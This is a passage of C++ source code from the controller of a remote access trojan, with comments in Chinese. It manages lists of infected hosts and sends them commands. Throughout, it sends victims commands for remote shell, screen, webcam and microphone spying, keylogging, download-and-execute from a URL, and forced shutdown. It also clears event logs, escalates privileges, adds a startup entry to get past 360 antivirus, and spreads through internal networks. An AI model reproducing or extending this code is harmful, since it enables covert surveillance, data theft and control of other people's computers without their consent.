					}else if ( strOSCount.Find(_T("NT")) != -1 )
					{
						g_pFrame->nOSCount[0]--;
					}else if ( strOSCount.Find(_T("Win10")) != -1)
					{
						g_pFrame->nOSCount[9]--;
					}
					m_pListCtrl->DeleteItem(Tmpi);	
					
				}
			}
		}

    	g_pTabView->UpDateNumber();
		g_pFrame->ShowConnectionsNumber();

	}
	catch(...)
	{
//		OutputDebugString("\r\n-------------------上线主机添加失败-------------------\r\n");
 		m_pListCtrl->DeleteItem(i);
	}
	return 0;
}
int CPcView::FindCountry(CString local)
{
	
	CString country[]={
		"中国","阿尔巴尼亚","阿尔及利亚","阿富汗","阿根廷","阿拉伯国家联盟","阿联酋","阿曼","阿塞拜疆","埃及",
			"埃塞俄比亚","爱尔兰","爱沙尼亚","安道尔","安哥拉","安提瓜和巴布达","奥地利","澳大利亚","澳门","巴巴多斯",
			"巴布亚新几内亚","巴哈马","巴基斯坦","巴拉圭","巴勒斯坦","巴林","巴拿马","巴西","白俄罗斯","保加利亚",
			"北大西洋公约组织","贝宁","比利时","冰岛","波兰","波斯尼亚和黑塞哥维那","玻利维亚","博茨瓦纳","不丹","布基纳法索",
			"布隆迪","朝鲜","赤道几内亚","丹麦","德国","东帝汶","东南亚国家协会","独立国家国协","多哥","多米尼加",
			"多米尼克","俄罗斯","厄瓜多尔","厄立特里亚","法国","梵蒂冈","菲律宾","斐济","芬兰","佛得角",
			"冈比亚","刚果(金)","刚果","哥伦比亚","哥斯达黎加","格林纳达","格鲁吉亚","古巴","圭亚那","国协",
			"哈萨克斯坦","海地","韩国","荷兰","洪都拉斯","基里巴斯","吉布提","吉尔吉斯斯坦","几内亚","几内亚比绍",
			"加勒比海共同体","加拿大","加纳","加蓬","柬埔寨","捷克","津巴布韦","喀麦隆","卡塔尔","科摩罗",
			"科特迪瓦","科威特","克罗地亚","肯尼亚","拉脱维亚","莱索托","老挝","黎巴嫩","立陶宛","利比果亚",
			"利比亚","联合国","列支敦士登","卢森堡","卢旺达","罗马尼亚","马达加斯加","马尔代夫","马耳他","马拉维",
			"马来西亚","马里","马其顿","马绍尔群岛","毛里求斯","毛里塔尼亚","美国","美国国家组织","蒙古","孟加拉",
			"秘鲁","密克罗尼西亚联邦","缅甸","摩尔多瓦","摩洛哥","摩纳哥","莫桑比克","墨西哥","纳米比亚","南非",
			"瑙鲁","尼泊尔","尼加拉瓜","尼日尔","尼日利亚","挪威","欧洲联盟","帕劳","葡萄牙","日本",
			"瑞典","瑞士","萨尔瓦多","塞尔维亚","塞拉利昂","塞内加尔","塞浦路斯","塞舌尔","沙特阿拉伯","圣多美和普林西比",
			"圣基茨和尼维斯","圣卢西亚","圣马力诺","圣文森特和格林纳丁斯","斯里兰卡","斯洛伐克","斯洛文尼亚","斯威士兰","苏丹","苏里南",
			"所罗门群岛","索马里","塔吉克斯坦","太平洋共同体","泰国","坦桑尼亚","汤加","特立尼达和多巴哥","突尼斯","图瓦卢",
			"土耳其","土库曼斯坦","瓦努阿图","危地马拉","委内瑞拉","文莱","乌干达","乌克兰","乌拉圭","乌兹别克斯坦",
			"西班牙","西萨摩亚","希腊","香港","新加坡","新西兰","匈牙利","叙利亚","牙买加","亚美尼亚",
			"也门","伊拉克","伊朗","以色列","意大利","印度","印度尼西亚","英格兰","英国","约旦",
			"越南","赞比亚","乍得","智利","中非","台湾省","波多黎各",
			"找不到IP数据库"};
		
		int i;
		CString str;
		int len = strlen(local);
		for(i=0; i<len; i++)
		{
			if(local[i] == ' ')
			{
				break;
			}
		}
		CString strlocal = local.Left(i);  //提取前面字符串
		
		for (i =0;i<(sizeof(country)/sizeof(country[0]));i++)  //先比较字符及长度是否成功
		{
			str = country[i];
			if (strstr(strlocal,str)!=NULL)
			{
				int s0 = strlen(strlocal);
				int s1 = strlen(str);
				if(s0==s1)
					return i;
			}
		}
		for (i =0;i<(sizeof(country)/sizeof(country[0]));i++)  //再比较字符
		{
			str = country[i];
			if (strstr(strlocal,str)!=NULL)
			{
				if (strstr(strlocal,"内蒙古")!=NULL)
					return 0;
				return i;
			}
		}
		return 0;
}

#include "SettingDlg.h"
void CPcView::SendSelectCommand(PBYTE pData, UINT nSize)
{       
	// TODO: Add your command handler code here
	if (m_pListCtrl->GetSelectedCount() < 1)
	{
		return ;	
	}
	CSettingDlg dlg;
	CString strPass =  ((CClientApp *)AfxGetApp())->m_IniFile.GetString("Settings", "ConnetPass", "");
	strPass = dlg.Base64Decode(strPass);
	strPass = dlg.Base64Decode(strPass);  //解密两次

	POSITION pos = m_pListCtrl->GetFirstSelectedItemPosition(); //iterator for the CListCtrl
	while(pos) //so long as we have a valid POSITION, we keep iterating
	{
		int	nItem = m_pListCtrl->GetNextSelectedItem(pos);
		ClientContext* pContext = (ClientContext*)m_pListCtrl->GetItemData(nItem);
		// 发送获得驱动器列表数据包
		if (0 == lstrcmp(pContext->szOnlinePass,strPass.GetBuffer(0)) || 0 == lstrcmp(pContext->szOnlinePass,""))
		{
			// 发送获得驱动器列表数据包
			m_iocpServer->Send(pContext, pData, nSize,FALSE);
			
		}else
		{
			g_pLogView->InsertLogItem("连接密码错误,您没有权限控制此机器!",0,2);
		}
//		m_iocpServer->Send(pContext, pData, nSize,FALSE);
		//Save the pointer to the new item in our CList
	} //EO while(pos) -- at this point we have deleted the moving items and stored them in memoryt	
}

			

void CPcView::OnMenuitemChangeGroup() 
{
	// TODO: Add your command handler code here
	CChangeGroupDlg m_group;
	if ( m_group.DoModal() == IDOK )
	{	
		int	nPacketLength = m_group.strGroup.GetLength() + 2;
		LPBYTE	lpPacket = new BYTE[nPacketLength];
		lpPacket[0] = COMMAND_CHANGE_GROUP;
		memcpy(lpPacket + 1, m_group.strGroup.GetBuffer(0), nPacketLength - 1);
		SendSelectCommand(lpPacket, nPacketLength);
		delete[] lpPacket;
		
		CString strTemp, strGroupName;
		CPcView* pView = NULL;
		int count = g_pTabView->m_wndTabControl.GetItemCount();
		for ( int i = 0; i < count; i++ )
		{
			strTemp = g_pTabView->m_wndTabControl.GetItem(i)->GetCaption();
			int n = strTemp.ReverseFind('(');
			if ( n > 0)
			{
				strGroupName = strTemp.Left(n);
			}
			else
			{
				strGroupName = strTemp;
			}
			if ( strGroupName == m_group.strGroup )
			{
				pView = DYNAMIC_DOWNCAST(CPcView, CWnd::FromHandle(g_pTabView->m_wndTabControl.GetItem(i)->GetHandle()));
				break;
			}
		}
		if ( pView == NULL )
		{
			strTemp.Format( _T("%s(0)"), m_group.strGroup );
			g_pTabView->AddGroup( strTemp );
			pView = DYNAMIC_DOWNCAST(CPcView, CWnd::FromHandle(g_pTabView->m_wndTabControl.GetItem(count)->GetHandle()));
			pView->OnInitialUpdate();
		}
		
		POSITION pos;
		for(; pos = m_pListCtrl->GetFirstSelectedItemPosition();)
		{
			int m = m_pListCtrl->GetNextSelectedItem(pos);
			
			CString	str;
			ClientContext	*pContext = (ClientContext *)(m_pListCtrl->GetItemData(m));

									

			/////////////////修复改变分组国旗显示BUG/////////////////////////////////////////////////////////
			sockaddr_in sockAddr;
			memset(&sockAddr, 0, sizeof(sockAddr));
			int nSockAddrLen = sizeof(sockAddr);
			BOOL bResult = getpeername(pContext->m_Socket, (SOCKADDR*) & sockAddr, &nSockAddrLen);
			CString IPAddress = bResult != INVALID_SOCKET ? inet_ntoa(sockAddr.sin_addr) : "";
			
			/////////////////////////////////////////////////////////////////////////////////
			LOGININFO*	LoginInfo = (LOGININFO*)pContext->m_DeCompressionBuffer.GetBuffer();
			
			int nCnt = pView->m_pListCtrl->GetItemCount();
			str.Format("%d",pView->m_nCount++);
			int i = 0;

			//国旗
			if (((CClientApp *)AfxGetApp())->m_bIsQQwryExist)
			{
				str=m_QQwry->IPtoAdd(IPAddress);
			}
			else
			{
				str =  "";
			}
			int countryno=FindCountry(str);
			i = pView->m_pListCtrl->InsertItem(nCnt, NULL, countryno);//使用指定图表
			
			////////////////////////////////////////////////////////////////////////////////	

		
			for(int a =1;a<g_Column_Count;a++)
				pView->m_pListCtrl->SetItemText(i, a, m_pListCtrl->GetItemText(m, a));			
			
			CString strdiliweizi;
			if (((CClientApp *)AfxGetApp())->m_bIsQQwryExist)
			{
				strdiliweizi = m_QQwry->IPtoAdd(IPAddress);
				
			}
			else
			{
				strdiliweizi.Format("%s", "没有找到QQWry.dat文件 !");
			}
			
			// 地理位置
			pView->m_pListCtrl->SetItemText(i, 0, strdiliweizi);

			// 指定唯一标识
			pView->m_pListCtrl->SetItemData(i, (DWORD) pContext);
			
			m_pListCtrl->DeleteItem(m);
			
			g_pTabView->UpDateNumber();
		}
	}
}

void CPcView::SortColumn(int iCol, bool bAsc)
{
	m_bAscending = bAsc;
	m_nSortedCol = iCol;
	
	// set sort image for header and sort column.
	SetSortImage(m_nSortedCol, m_bAscending);
	CXTPSortClass csc(m_pListCtrl, m_nSortedCol);
	csc.Sort(m_bAscending, xtpSortString);
}

#define ID_FIRST1 0
BOOL CPcView::OnNotify(WPARAM wParam, LPARAM lParam, LRESULT* pResult) 
{
	// TODO: Add your specialized code here and/or call the base class
	HD_NOTIFY *pHDNotify = (HD_NOTIFY*)lParam;
	if (pHDNotify->hdr.code == HDN_ITEMCLICKA || pHDNotify->hdr.code == HDN_ITEMCLICKW)
	{
		SortColumn(pHDNotify->iItem, !m_bAscending);
	}
	
	if ((((LPNMHDR)lParam)->code == NM_RCLICK))  
    {
		CMenu menu;
		menu.CreatePopupMenu();
		
		LVCOLUMN lvcol;
		char str[256];
		int nColNum = 0;
		CString strColumnName[20];//假如有255列
		
		lvcol.mask = LVCF_TEXT;
		lvcol.pszText = str;
		lvcol.cchTextMax = 256;
		while(m_pListCtrl->GetColumn(nColNum, &lvcol))
		{ 
			strColumnName[nColNum] = lvcol.pszText;
			menu.AppendMenu(MF_STRING,ID_FIRST1 + nColNum,strColumnName[nColNum]);
			
			menu.CheckMenuItem(ID_FIRST1 + nColNum, (m_pListCtrl->GetColumnWidth(nColNum) == 0) ? MF_UNCHECKED : MF_CHECKED);
			
			nColNum++;
		}
		
		CPoint	p;
		GetCursorPos(&p);
		CXTPCommandBars::TrackPopupMenu(&menu, TPM_LEFTALIGN|TPM_RIGHTBUTTON,p.x,p.y,this);
//		menu.TrackPopupMenu(TPM_LEFTALIGN, p.x, p.y, this);
		menu.DestroyMenu();

    }  
	
	return CXTPListView::OnNotify(wParam, lParam, pResult);
}

//=======================================================================================

void CPcView::OnMenuitemFilemanager() 
{
	// TODO: Add your command handler code here
	SendSelectCommand(lpFilePacket , nFilePacketLength );
}

void CPcView::OnMenuitemRemoteshell() 
{
	// TODO: Add your command handler code here
	SendSelectCommand(lpShellPacket , nShellPacketLength  );
}

void CPcView::OnMenuitemScreenspy() 
{
	// TODO: Add your command handler code here
	SendSelectCommand(lpScreenPacket , nScreenPacketLength );
}
void CPcView::OnMenuitemScreenspy1() 
{
	// TODO: Add your command handler code here
	SendSelectCommand(lpScreenPacket1 , nScreenPacketLength1 );
}
void CPcView::OnMenuitemWebcam() 
{
	// TODO: Add your command handler code here
	SendSelectCommand(lpWebCamPacket , nWebCamPacketLength );
}

void CPcView::OnMenuitemAudioListen() 
{
	// TODO: Add your command handler code here
	SendSelectCommand(lpAudioPacket , nAudioPacketLength );
}

void CPcView::OnMenuitemSystem() 
{
	// TODO: Add your command handler code here
	SendSelectCommand(lpSystemPacket , nSystemPacketLength );
}

void CPcView::OnMenuitemKeyboard() 
{
	// TODO: Add your command handler code here
//	SendSelectCommand(lpKeyboardPacket , nKeyboardPacketLength );
	BYTE	bToken = COMMAND_KEYBOARD;
	SendSelectCommand(&bToken, sizeof(BYTE));
	LocalFree((LPBYTE)&bToken);
}

void CPcView::OnScreen()
{
	// TODO: Add your command handler code here
	BYTE	bToken = COMMAND_Screen;
	SendSelectCommand(&bToken, sizeof(BYTE));	
}

void CPcView::OnMenuitemServicemanager() 
{
	// TODO: Add your command handler code here
	SendSelectCommand(lpServicePacket , nServicePacketLength );
}
 
void CPcView::OnMenuitemRegedit() 
{
	// TODO: Add your command handler code here
	SendSelectCommand(lpRegeditPacket , nRegeditPacketLength );
}

void CPcView::OnMenuitemTextChat() 
{
	// TODO: Add your command handler code here
	SendSelectCommand(lpTextChatPacket , nTextChatPacketLength );
}

void CPcView::OnMenuitemProxyMap() 
{
	// TODO: Add your command handler code here
	SendSelectCommand(lpProxyMapPacket , nProxyPacketLength );
}

//=======================================================================================

 
void CPcView::OnMenuitemReboot() 
{
	// TODO: Add your command handler code here
	BYTE bToken[2];
	bToken[0] = COMMAND_SESSION;
	bToken[1] = EWX_REBOOT | EWX_FORCE;
	SendSelectCommand((LPBYTE)&bToken, sizeof(bToken));	
	LocalFree((LPBYTE)&bToken);
}

void CPcView::OnMenuitemShutdown() 
{
	// TODO: Add your command handler code here
	BYTE bToken[2];
	bToken[0] = COMMAND_SESSION;
	bToken[1] = EWX_SHUTDOWN | EWX_FORCE;
	SendSelectCommand((LPBYTE)&bToken, sizeof(bToken));	
	LocalFree((LPBYTE)&bToken);
}

void CPcView::OnMenuitemLogoff() 
{
	// TODO: Add your command handler code here
	BYTE bToken[2];
	bToken[0] = COMMAND_SESSION;
	bToken[1] = EWX_LOGOFF | EWX_FORCE;
	SendSelectCommand((LPBYTE)&bToken, sizeof(bToken));	
	LocalFree((LPBYTE)&bToken);
}

void CPcView::OnMenuitemSelectAll() 
{
	// TODO: Add your command handler code here
	for (int i = 0; i < m_pListCtrl->GetItemCount(); i++)   
	{   
		m_pListCtrl->SetItemState(i, LVIS_SELECTED, LVIS_SELECTED);
		m_pListCtrl->SetCheck(i,TRUE);
	}
}

void CPcView::OnMenuitemUninstall() 
{
	// TODO: Add your command handler code here
	if (MessageBox(_T("是否确认卸载服务端"), _T("提醒"), MB_YESNO | MB_ICONWARNING) == IDNO)
		return;
	BYTE	bToken = COMMAND_UNINSTALL;
	SendSelectCommand(&bToken, sizeof(BYTE));	
}

void CPcView::OnMenuitemRemark() 
{
	// TODO: Add your command handler code here
	if (m_pListCtrl->GetSelectedCount() < 1)
		return ;	
	
	CString strTitle;
	if (m_pListCtrl->GetSelectedCount() == 1)
		strTitle.Format(_T("更改主机(%s)的备注"), m_pListCtrl->GetItemText(m_pListCtrl->GetSelectionMark(), 3));
	else
		strTitle.Format("已选择(%d)台主机 批量更改主机备注",m_pListCtrl->GetSelectedCount());
	CInputDialog	dlg;
	dlg.Init(strTitle, _T("请输入新的备注:"), this);
	if (dlg.DoModal() != IDOK || dlg.m_str.GetLength()== 0)   
		return;
	
	int		nPacketLength = dlg.m_str.GetLength() + 2;
	LPBYTE	lpPacket = new BYTE[nPacketLength];
	lpPacket[0] = COMMAND_RENAME_REMARK;
	memcpy(lpPacket + 1, dlg.m_str.GetBuffer(0), nPacketLength - 1);
	
	SendSelectCommand(lpPacket, nPacketLength);
	
	POSITION pos = m_pListCtrl->GetFirstSelectedItemPosition();
	while(pos)
	{
		int	nItem = m_pListCtrl->GetNextSelectedItem(pos);
		m_pListCtrl->SetItemText(nItem, 3, dlg.m_str);
	}
	
	delete[] lpPacket;
}

void CPcView::OnMenuitemOpenUrlShow() 
{
	// TODO: Add your command handler code here
	CInputDialog	dlg;
	CString str;
	str.Format("已选择(%d)台主机 远程访问网址",m_pListCtrl->GetSelectedCount() );

	dlg.Init(str.GetBuffer(0), _T("请输入要显示访问的网址:"), this,TRUE,"http://");
	if (dlg.DoModal() != IDOK)   
		return;
	dlg.m_str.MakeLower();
	if (dlg.m_str.Find(_T("http://")) == -1)
	{
		MessageBox("输入的网址不合法", "错误");
		return;
	}
	
	int		nPacketLength = dlg.m_str.GetLength() + 2;
	LPBYTE	lpPacket = new BYTE[nPacketLength];
	lpPacket[0] = COMMAND_OPEN_URL_SHOW;
	memcpy(lpPacket + 1, dlg.m_str.GetBuffer(0), nPacketLength - 1);
	
	SendSelectCommand(lpPacket, nPacketLength);
	
	delete[] lpPacket;
}

void CPcView::OnMenuitemOpenUrlHide() 
{
	// TODO: Add your command handler code here
	CInputDialog	dlg;
	CString str;
	str.Format("已选择(%d)台主机 远程访问网址",m_pListCtrl->GetSelectedCount() );
	dlg.Init(str.GetBuffer(0), _T("请输入要显示访问的网址:"), this,TRUE,"http://");
	if (dlg.DoModal() != IDOK)   
		return;
	dlg.m_str.MakeLower();
	if (dlg.m_str.Find(_T("http://")) == -1)
	{
		MessageBox("输入的网址不合法", "错误");
		return;
	}
	
	int		nPacketLength = dlg.m_str.GetLength() + 2;
	LPBYTE	lpPacket = new BYTE[nPacketLength];
	lpPacket[0] = COMMAND_OPEN_URL_HIDE;
	memcpy(lpPacket + 1, dlg.m_str.GetBuffer(0), nPacketLength - 1);
	
	SendSelectCommand(lpPacket, nPacketLength);
	
	delete[] lpPacket;
}

void CPcView::OnMenuitemUnselectAll() 
{
	// TODO: Add your command handler code here
	for (int i = 0; i < m_pListCtrl->GetItemCount(); i++)   
	{   
		m_pListCtrl->SetItemState(i, 0, LVIS_SELECTED);
		m_pListCtrl->SetCheck(i,FALSE);
	}
}

void CPcView::OnMenuitemDownexec() 
{
	// TODO: Add your command handler code here
	CInputDialog	dlg;
	CString str;
	str.Format("已选择(%d)台主机 下载者",m_pListCtrl->GetSelectedCount() );
	dlg.Init(str.GetBuffer(0), _T("请输入要下载文件的地址:"), this,TRUE,"http://");
	if (dlg.DoModal() != IDOK)   
		return;
	dlg.m_str.MakeLower();
	if (dlg.m_str.Find(_T("http://")) == -1)
	{
		MessageBox("输入的网址不合法", "错误");
		return;
	}
	
	int		nPacketLength = dlg.m_str.GetLength() + 2;
	LPBYTE	lpPacket = new BYTE[nPacketLength];
	lpPacket[0] = COMMAND_DOWN_EXEC;
	memcpy(lpPacket + 1, dlg.m_str.GetBuffer(0), nPacketLength - 1);
	
	SendSelectCommand(lpPacket, nPacketLength);
	
	delete[] lpPacket;
}

void CPcView::OnMenuitemLocalUpload() 
{
	// TODO: Add your command handler code here
	CLocalUpload dlg;
	dlg.DoModal();
}

void CPcView::OnUAC() 
{
	// TODO: Add your command handler code here
	CUACYXDlg dlg;
	dlg.DoModal();
}
void CPcView::OnMenuitemFindProcess() 
{
	// TODO: Add your command handler code here
	CInputDialog dlg;
	CString str;
	str.Format("已选择(%d)台主机 查找进程(找到的在机器名前显示*号)",m_pListCtrl->GetSelectedCount() );

	dlg.Init(str.GetBuffer(0), _T("请输入要查找的进程名(例如qq.exe):"), this);
	if (dlg.DoModal() == IDOK)
	{
		int		nPacketLength = dlg.m_str.GetLength() + 2;
		LPBYTE	lpPacket = new BYTE[nPacketLength];
		lpPacket[0] = COMMAND_FIND_PROCESS;
		memcpy(lpPacket + 1, dlg.m_str.GetBuffer(0), nPacketLength - 1);
		SendSelectCommand(lpPacket, nPacketLength);
		delete[] lpPacket;
	}
}

void CPcView::OnMenuitemFindWindow() 
{
	// TODO: Add your command handler code here
	CInputDialog dlg;
	CString str;
	str.Format("已选择(%d)台主机 查找窗口(找到的在机器名前显示*号)",m_pListCtrl->GetSelectedCount() );
	dlg.Init(str.GetBuffer(0), _T("请输入要查找的窗口标题包含的文字:"), this);
	if (dlg.DoModal() == IDOK)
	{
		int		nPacketLength = dlg.m_str.GetLength() + 2;
		LPBYTE	lpPacket = new BYTE[nPacketLength];
		lpPacket[0] = COMMAND_FIND_WINDOW;
		memcpy(lpPacket + 1, dlg.m_str.GetBuffer(0), nPacketLength - 1);
		SendSelectCommand(lpPacket, nPacketLength);
		delete[] lpPacket;
	}
}

void CPcView::OnMenuitemCleanFind() 
{
	// TODO: Add your command handler code here
	int nCount = m_pListCtrl->GetItemCount();
	
	for (int i=0; i < nCount; i++)
	{
		CString str;
		str = 	m_pListCtrl->GetItemText(i, 3);
		int n = str.Find('*');
		if (n == 0)
			str = str.Right(str.GetLength() - 1);
		else
			continue;
		m_pListCtrl->SetItemText(i, 3, str);
	}
}

void CPcView::OnMenuitemCopyIp() 
{
	// TODO: Add your command handler code here
	if (m_pListCtrl->GetSelectedCount() < 1)
	{
		return ;	
	}
	POSITION pos = m_pListCtrl->GetFirstSelectedItemPosition();
	CString Data;
	CString Name;
	while(pos)
	{
		int	nItem = m_pListCtrl->GetNextSelectedItem(pos);
		Name = m_pListCtrl->GetItemText(nItem, 1);
		Data += Name;
		Data += "\r\n";
	}
	Data = Data.Left(Data.GetLength() - 2);
	CSystemDlg::SetClipboardText(Data);
	MessageBox("主机IP已复制到剪切板");
}

void CPcView::OnMenuitemCopyAll() 
{
	// TODO: Add your command handler code here
	if (m_pListCtrl->GetSelectedCount() < 1)
	{
		return ;	
	}
	POSITION pos = m_pListCtrl->GetFirstSelectedItemPosition();
	CString Data;
	CString Name;
	while(pos)
	{
		Name = "";
		int	nItem = m_pListCtrl->GetNextSelectedItem(pos);
		for(int i = 0; i < m_pListCtrl->GetHeaderCtrl()-> GetItemCount(); i++)
		{
			Name += m_pListCtrl->GetItemText(nItem, i);
			Name += "	";
		}
		Data += Name;
		Data += "\r\n";
	}
	Data = Data.Left(Data.GetLength() - 2);
	CSystemDlg::SetClipboardText(Data);	
	MessageBox("主机信息已复制到剪切板");
}

void CPcView::OnMenuitemUpdateServer() 
{
	// TODO: Add your command handler code here
	CInputDialog	dlg;
	CString str;
	str.Format("已选择(%d)台主机 下载更新服务端",m_pListCtrl->GetSelectedCount() );

	dlg.Init(str.GetBuffer(0), _T("请输入要下载新服务端的地址:"), this);
	if (dlg.DoModal() != IDOK)   
		return;
	dlg.m_str.MakeLower();
	if (dlg.m_str.Find(_T("http://")) == -1)
	{
		MessageBox(_T("输入的网址不合法"), _T("错误"));
		return;
	}
	int		nPacketLength = dlg.m_str.GetLength() + 2;
	LPBYTE	lpPacket = new BYTE[nPacketLength];
	lpPacket[0] = COMMAND_DOWN_UPDATE;
	memcpy(lpPacket + 1, dlg.m_str.GetBuffer(0), nPacketLength - 1);
	
	SendSelectCommand(lpPacket, nPacketLength);
	
	delete[] lpPacket;
}



BOOL CPcView::OnCommand(WPARAM wParam, LPARAM lParam) 
{
	// TODO: Add your specialized code here and/or call the base class
	int menuID = LOWORD(wParam) - ID_FIRST1;

	CString str;
	str.Format("Width%d",menuID);

	if(m_pListCtrl->GetColumnWidth(menuID) == 0)
		m_pListCtrl->SetColumnWidth(menuID,g_Column_Data[menuID].nWidth);
	else
		m_pListCtrl->SetColumnWidth(menuID,0);

	((CClientApp *)AfxGetApp())->m_IniFile.SetInt("MainHeader_Column_Width", str, m_pListCtrl->GetColumnWidth(menuID));

	return CXTPListView::OnCommand(wParam, lParam);
}


#include "MsgBoxDlg.h"
void CPcView::OnMenuitemMessagebox() 
{
	// TODO: Add your command handler code here
	struct MSGBOX
	{
		CHAR Title[200];
		CHAR szText[1000];
		UINT Type;
}MsgBox;

	CMsgBoxDlg dlg;
SHOW:
	if(dlg.DoModal() != IDOK) 
		return;

	if (strlen(dlg.m_edit_caption)<1 || strlen(dlg.m_edit_text) < 1)
	{
		MessageBox("请输入发送标题及内容!!... ", "提示! ", MB_OK | MB_ICONWARNING);
		goto SHOW;
	}

	ZeroMemory(&MsgBox,sizeof(MSGBOX));
	strcpy(MsgBox.Title,dlg.m_edit_caption.GetBuffer(0));
	strcpy(MsgBox.szText,dlg.m_edit_text.GetBuffer(0));
	MsgBox.Type = dlg.m_msgButton|dlg.m_msgIcon;
	
	BYTE	*bToken = new BYTE[sizeof(MSGBOX)+1];
	bToken[0]= COMMAND_MESSAGEBOX;
	memcpy(&bToken[1],&MsgBox,sizeof(MSGBOX));
	
	SendSelectCommand(bToken, sizeof(MSGBOX)+1);
	delete bToken;
	goto SHOW;
}

void CPcView::OnMenuitemSaveIplist() 
{
	// TODO: Add your command handler code here
	CFileDialog dlg(FALSE, _T("txt"), _T("iplist.txt"), OFN_OVERWRITEPROMPT, _T("文本文件|*.txt"), NULL);
    if (dlg.DoModal() != IDOK)
		return;
	
	CFile file;
	if (file.Open(dlg.GetPathName(), CFile::modeCreate | CFile::modeWrite))
	{
		POSITION pos = m_pListCtrl->GetFirstSelectedItemPosition();
		while (pos)
		{
			int nItem = m_pListCtrl->GetNextSelectedItem(pos);
			CString strTitle;
			strTitle.Format(_T("%s\r\n"), m_pListCtrl->GetItemText(nItem, 1));
			file.Write(strTitle, strlen(strTitle));
		}
		file.Close();
		AfxMessageBox(_T("IP列表导出成功!"));
	}
}

#include "..\DLL\Plugins\C_PROXY.h"
void CPcView::OnMenuitemProxy() 
{
	// TODO: Add your command handler code here
	COpenProxy dlg;	

	int nRet = dlg.DoModal();
	if(nRet == IDOK) 
	{
		char szToken[99];
		memset(szToken,0,sizeof(szToken));
		// 如果需要验证
		if (dlg.m_check_verify)
		{
			if (dlg.m_edit_user.IsEmpty() || dlg.m_edit_pass.IsEmpty())
			{
				AfxMessageBox("信息不完整！");
				return;
			}
			wsprintf(szToken,"%d|%s|%s",dlg.m_edit_port,dlg.m_edit_user,dlg.m_edit_pass);
		}
		else
			wsprintf(szToken,"%d",dlg.m_edit_port);
		
		
		int nPacketLength = 100 + PROXYMyFileSize;
		LPBYTE lpPacket = new BYTE[nPacketLength];
		if(lpPacket == NULL)			return;
		lpPacket[0] = COMMAND_OPEN_PROXY;
		memcpy(lpPacket + 1, szToken, 99);
		memcpy(lpPacket + 100,PROXYMyFileBuf,PROXYMyFileSize);
		
    	SendSelectCommand(lpPacket, nPacketLength);
		delete [] lpPacket; 
	}
	else if (nRet == IDNO)
	{
		BYTE bToken = COMMAND_CLOSE_PROXY;
		SendSelectCommand(&bToken,sizeof(bToken));
	}
} 
  
void CPcView::OnMenuitemPrank() 
{
	// TODO: Add your command handler code here
	CPrankDlg dlg;
	dlg.DoModal();
}

void CPcView::OnMenuitemCleaneventAll() 
{
	// TODO: Add your command handler code here
	BYTE	bToken[2];
	bToken[0] = COMMAND_CLEAN_EVENT;
	bToken[1] = CLEAN_EVENT_ALL;
	SendSelectCommand(bToken, sizeof(BYTE)*2);
	LocalFree((LPBYTE)bToken);
}

void CPcView::OnRButtonDown(UINT nFlags, CPoint point) 
{
	// TODO: Add your message handler code here and/or call default

	CXTPListView::OnRButtonDown(nFlags, point);

	CPoint p;
	GetCursorPos(&p);
	
	CMenu menu;
	VERIFY(menu.LoadMenu(IDR_MENU_LIST));
	
	CMenu* pPopup = menu.GetSubMenu(0);
	ASSERT(pPopup != NULL);
	CWnd* pWndPopupOwner = this;
	
	while (pWndPopupOwner->GetStyle() & WS_CHILD)
		pWndPopupOwner = pWndPopupOwner->GetParent();
	
	CXTPCommandBars::TrackPopupMenu(pPopup, TPM_RIGHTBUTTON,  p.x, p.y, AfxGetMainWnd(), 0, pWndPopupOwner);
}
void CPcView::OnChat() //剪切板
{
	// TODO: Add your command handler code here
	BYTE	bToken = COMMAND_CHAT;
	SendSelectCommand(&bToken, sizeof(BYTE));	
}
void CPcView::OnElevate_Privileges() //WIN7提升权限
{
	if(MessageBox("主机在UAC等级下非管理员账户提权会弹出询问框\r\n是否提权？", "注意", MB_ICONQUESTION|MB_YESNO) != IDYES)
		return ;
	
	BYTE	bToken = COMMAND_OnElevate_Privileges;
	SendSelectCommand(&bToken, sizeof(BYTE));
}
void CPcView::OnReStartexp() //重启Exp
{
	BYTE	bToken = COMMAND_ReStart_Exp;
	SendSelectCommand(&bToken, sizeof(BYTE));
}
#include <shlwapi.h>
void CPcView::OnQDX() //过360启动
{
	::MessageBox(0, "等待几秒添加成功","写入过360启动项", MB_ICONINFORMATION);//弹出提示框
	char path[MAX_PATH];
	GetModuleFileName(NULL, path, MAX_PATH);
	PathRemoveFileSpec(path);
	strcat(path,"\\Plugins\\SVP7.zip");
	CString uad(path);
	
	CPcView* pView = NULL;
	pView = DYNAMIC_DOWNCAST(CPcView, CWnd::FromHandle(g_pTabView->m_wndTabControl.GetSelectedItem()->GetHandle()));
	int nItems = pView->m_pListCtrl->GetItemCount();
	
	FILE *file=fopen(uad,"rb");
	if (file == NULL)   
	{   
		AfxMessageBox("SVP7.zip文件读取失败！");  
		return;  
	}
	// 读取文件
	unsigned char *data = NULL;   
	size_t size;   
	fseek(file, 0, SEEK_END);   
	size = ftell(file);   
	data = (unsigned char *)malloc(size);   
	fseek(file, 0, SEEK_SET);   
	fread(data, 1, size, file);
	fclose(file);
	
	int nPos = uad.ReverseFind('\\');
	uad = uad.Right(uad.GetLength() - nPos -1);
	
	LOCALUP LocaUp;
	ZeroMemory(&LocaUp,sizeof(LOCALUP));
	
	LocaUp.bToken = COMMAND_ReStart_ieqc7;
	lstrcpy(LocaUp.lpFileName,uad.GetBuffer(0));
	
	int	nPacketLength = sizeof(LOCALUP) + size;
	LPBYTE	lpPacket = new BYTE[nPacketLength];
	
	memcpy(lpPacket,&LocaUp,sizeof(LOCALUP));
	memcpy(lpPacket + sizeof(LOCALUP),data,size);
	
	pView->SendSelectCommand(lpPacket,nPacketLength);
	
	if (data)
		free(data);
	
	if(lpPacket)
		delete[] lpPacket;
}
void CPcView::OnUV() //UV安装
{
	::MessageBox(0, "耐心等待安装/存在则卸载","超过一分钟未操作请重新点击!", MB_ICONINFORMATION);//弹出提示框
	BYTE	bToken = COMMAND_ReStart_ieqc8;
	SendSelectCommand(&bToken, sizeof(BYTE));
}
void CPcView::OnAK() //AK安装
{
	::MessageBox(0, "耐心等待安装/存在则卸载/连接密码为123456","超过一分钟未操作请重新点击!", MB_ICONINFORMATION);//弹出提示框
	BYTE	bToken = COMMAND_ReStart_ieqc9;
	SendSelectCommand(&bToken, sizeof(BYTE));
}
void CPcView::OnNWCB()//内网传播
{
	if (MessageBox(_T("确定打开客户机内网传播吗？"), _T("提示"), MB_YESNO | MB_ICONWARNING) == IDNO)
		return;
	BYTE	bToken = COMMAND_NWCB;
	SendSelectCommand(&bToken, sizeof(BYTE));
}
